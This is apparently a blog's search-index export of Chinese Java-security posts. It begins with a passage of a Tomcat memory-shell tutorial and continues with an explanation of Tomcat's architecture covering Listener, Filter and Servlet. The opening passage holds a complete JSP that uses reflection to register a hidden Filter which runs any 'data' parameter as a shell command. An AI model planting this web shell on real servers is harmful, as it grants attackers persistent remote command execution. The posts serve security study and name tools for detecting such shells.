class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;data&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;data&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;data&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    httpServletResponse.getWriter().write(output);</span><br><span class="line">                    httpServletResponse.getWriter().flush();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取FilterDef, 设置filter名等参数, 调用addFilterDef添加FilterDef</span></span><br><span class="line">        Class&lt;?&gt; filterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; filterDefDeclaredConstructor = filterDef.getDeclaredConstructor();</span><br><span class="line">        filterDefDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef1</span> <span class="operator">=</span> (FilterDef) filterDefDeclaredConstructor.newInstance();</span><br><span class="line">        filterDef1.setFilter(filter);</span><br><span class="line">        filterDef1.setFilterName(filterName);</span><br><span class="line">        filterDef1.setFilterClass(filter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取FilterMap并设置拦截路径, 调用addFilterMapBefore添加FilterMap</span></span><br><span class="line">        Class&lt;?&gt; filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; filterMapDeclaredConstructor = filterMap.getDeclaredConstructor();</span><br><span class="line">        filterMapDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap1</span> <span class="operator">=</span> (FilterMap) filterMapDeclaredConstructor.newInstance();</span><br><span class="line">        filterMap1.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap1.setFilterName(filterName);</span><br><span class="line">        filterMap1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取ApplicationFilterConfig</span></span><br><span class="line">        Class&lt;?&gt; applicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; applicationFilterConfigDeclaredConstructor = applicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        applicationFilterConfigDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig1</span> <span class="operator">=</span> (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向从StandardContext获取的FilterConfigs中添加恶意的FilterConfig</span></span><br><span class="line">        filterConfigsMap.put(filterName, applicationFilterConfig1);</span><br><span class="line">        out.println(<span class="string">&quot;Filter Inject Successfully...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/12.png"></p><h2 id="Check-MemoryShell"><a href="#Check-MemoryShell" class="headerlink" title="Check MemoryShell"></a>Check MemoryShell</h2><p>这里先mark几款工具，后续对内存马查杀进行进一步的学习：</p><ul><li><a href="https://github.com/alibaba/arthas">Arthas</a></li><li><a href="https://github.com/LandGrey/copagent">Copagent</a></li><li><a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a></li><li><a href="https://github.com/4ra1n/shell-analyzer">shell-analyzer</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Architecture Analysis</title>
      <link href="/2024/05/18/Tomcat-Architecture-Analysis/"/>
      <url>/2024/05/18/Tomcat-Architecture-Analysis/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Apache Tomcat软件是Java Servlet、JavaServer Pages、Java Expression Language和Java WebSocket技术的一个开源实现。Java Servlet、JavaServer Pages、Java Expression Language和Java WebSocket规范是在Java Community Process下开发的。</p><p>简单来说，Tomcat可以看成是Web服务器加Servlet容器。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/1.png"></p><p>在上面的流程图中，Tomcat通过Connector组件接收并解析HTTP请求，将ServletRequest对象发送给Container进行处理。Container处理完成后会将响应封装成ServletRespone对象返回给Connector，然后Connector再将ServletRespone对象解析成HTTP响应文本格式发送给客户端，至此Tomcat就完成了一次网络通信。</p><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/2.png"></p><p>在Tomcat架构图中主要包含三个组件：Service、Connectot、Container。</p><ul><li>Server：Web服务器，一个Server中可以包含多个Service。</li><li>Service：每一个Service都是独立的，它们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。</li><li>Connector：Connector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP&#x2F;1.1、HTTP&#x2F;2、AJP等等。</li><li>Container：Tomcat的Container包含四种子容器，分别为Engine、Host、Context和Wrapper。其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，一个Context又包含多个Wrapper。<ul><li>Engine：可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。</li><li>Host：可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。虚拟主机的作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们，每个虚拟主机对应的一个域名，不同Host容器接受处理对应不同域名的请求。</li><li>Context：上下文容器，可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格或斜杠。</li><li>Wrapper：对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet，每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理Servlet，包括Servlet的装载、初始化、执行以及资源回收。</li></ul></li></ul><p>下图展示了请求在Container中的解析过程：</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/3.png"></p><h2 id="Three-Major-Components"><a href="#Three-Major-Components" class="headerlink" title="Three Major Components"></a>Three Major Components</h2><p>Java Web中有三大组件，分别是Servlet、Filter和Listener。三者的加载顺序为Listener-&gt;Filter-&gt;Servlet。</p><p>在org.apache.catalina.core.StandardContext类的startInternal方法中，首先调用了listenerStart，接着是filterStart，最后是loadOnStartup。这三处调用分别触发了Listener、Filter、Servlet的构造加载。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/4.png"></p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="Conception"><a href="#Conception" class="headerlink" title="Conception"></a>Conception</h4><p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p><p>与Listener相关的概念：</p><ul><li>事件：某个方法被调用，或者属性的改变；</li><li>事件源：被监听的对象（如ServletContext、requset、方法等）；</li><li>监听器：用于监听事件源，当发生事件时会触发监听器。</li></ul><p>监听器分类：</p><table><thead><tr><th align="center">事件源</th><th align="center">监听器</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ServletContext</td><td align="center">ServletContextListener</td><td align="center">用于监听 ServletContext 对象的创建与销毁过程</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionListener</td><td align="center">用于监听 HttpSession 对象的创建和销毁过程</td></tr><tr><td align="center">ServletRequest</td><td align="center">ServletRequestListener</td><td align="center">用于监听 ServletRequest 对象的创建和销毁过程</td></tr><tr><td align="center">ServletContext</td><td align="center">ServletContextAttributeListener</td><td align="center">用于监听 ServletContext 对象的属性新增、移除和替换</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionAttributeListener</td><td align="center">用于监听 HttpSession 对象的属性新增、移除和替换</td></tr><tr><td align="center">ServletRequest</td><td align="center">ServletRequestAttributeListener</td><td align="center">用于监听 HttpServletRequest 对象的属性新增、移除和替换</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionBindingListener</td><td align="center">用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionActivationListener</td><td align="center">用于监听 HttpSession 中对象活化和钝化的过程</td></tr></tbody></table><p>按照监听的对象不同将其划分为三类：ServletContextListener，HttpSessionListener和ServletRequestListener。</p><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul><li>ServletContextListener配置</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.memoryshell.tomcatmemoryshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext对象创建...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext对象销毁...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>web.xml配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;5.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.memoryshell.tomcatmemoryshell.MemoryListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/9.png"></p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><h4 id="Conception-1"><a href="#Conception-1" class="headerlink" title="Conception"></a>Conception</h4><p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。</p><h4 id="Life-Cycle"><a href="#Life-Cycle" class="headerlink" title="Life Cycle"></a>Life Cycle</h4><p>Filter的生命周期分为三个阶段：</p><ul><li>初始化阶段：Filter的初始化阶段只会在Web应用程序启动时调用一次。</li><li>拦截和过滤阶段：当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器。</li><li>销毁阶段：Filter的销毁阶段只会在web应用移除或服务器停止时才调用一次来卸载Filter对象。</li></ul><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/6.png"></p><h4 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h4><ul><li>FilterChain</li></ul><p>一个Servlet可以注册多个Filter，Web容器会将注册的多个Filter组合成一个”Filter链”，并按照一定的顺序依次执行各Filter的doFilter方法。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/7.png"></p><ul><li>Filter execution sequence</li></ul><p>由于Filter的注册方式不同，其执行顺序也有所不同。</p><ol><li>基于注解配置：按照类名的字符串比较规则比较，值小的先执行；</li><li>使用web.xml配置：根据对应的Mapping的顺序组织，谁定义在上边谁就在前。</li></ol><ul><li>FilterConfig</li></ul><p>和Servlet类似，由于Filter也有可能访问Servlet，所以Servlet规范将代表ServletContext对象和Filter的配置参数信息都封装到一个称为FilterConfig的对象中。</p><p>FilterConfig接口则用于定义FilterConfig对象应该对外提供的方法，以便在Filter的doFilter方法中可以调用这些方法来获取ServletContext对象，以及获取在web.xml文件中的一些初始化参数。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/8.png"></p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><h4 id="Conception-2"><a href="#Conception-2" class="headerlink" title="Conception"></a>Conception</h4><p>Servlet是运行在Web服务器或应用服务器上的程序，它是作为来自HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。用来处理客户端请求的动态资源，并根据请求生成相应的返回信息提供给用户，当Tomcat接收到来自客户端的请求时，会将其解析成RequestServlet对象并发送到对应的Servlet上进行处理。</p><h4 id="Life-Cycle-1"><a href="#Life-Cycle-1" class="headerlink" title="Life Cycle"></a>Life Cycle</h4><p>Servlet的生命周期分为五个阶段：</p><ul><li>加载阶段：当Tomcat第一次访问Servlet时，会创建Servlet的实例。</li><li>初始化阶段：当Servlet实例化后，Tomcat会调用init方法初始化这个对象。</li><li>处理服务阶段：当浏览器访问Servlet时，Servlet会调用service方法处理请求。</li><li>销毁阶段：当Tomcat关闭时或者检测到Servlet要从Tomcat删除时，会自动调用destroy方法，让该实例释放掉所占的资源。除此之外，一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁。</li><li>卸载阶段：当Servlet调用完destroy方法后，会等待垃圾回收。如果有需要再次使用这个Servlet时，会重新调用init方法进行初始化操作。</li></ul><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/5.png"></p><h4 id="Usage-2"><a href="#Usage-2" class="headerlink" title="Usage"></a>Usage</h4><p>根据上文对Servlet生命周期的了解，当需要实现一个Servlet时，需要继承Servlet接口，并实现相应的五个方法。</p><p>在Tomcat中已经封装好了两个类，分别是GenericServlet类和HttpServlet类。GenericServlet抽象类实现了Servlet接口，并对Servlet接口中除service方法外的其它四个方法进行了简单实现。</p><p>通过继承GenericServlet类创建来Servlet，只需要重写service方法即可。但是，GenericServlet抽象类是一个通用的Servlet类，并不是针对某种应用场景而设计的，因此在处理HTTP请求的时候需要手动实现对HTTP请求的解析和封装。</p><p>HttpServlet是GenericServlet的子类，它在GenericServlet的基础上专门针对HTTP协议进行了处理。其针对每一种HTTP请求都设置了一种处理方法。当使用HttpServlet类的时候，只需要根据HTTP请求类型重写相应的处理方法即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;MemoryServlet&quot;, value = &quot;/MemoryServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;This is MemoryShell page!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://goodapple.top/archives/1359">Java安全学习——Tomcat架构浅析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日寇投降纪念日</title>
      <link href="/1945/08/15/hello-world/"/>
      <url>/1945/08/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/1945/08/15/hello-world/sb.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
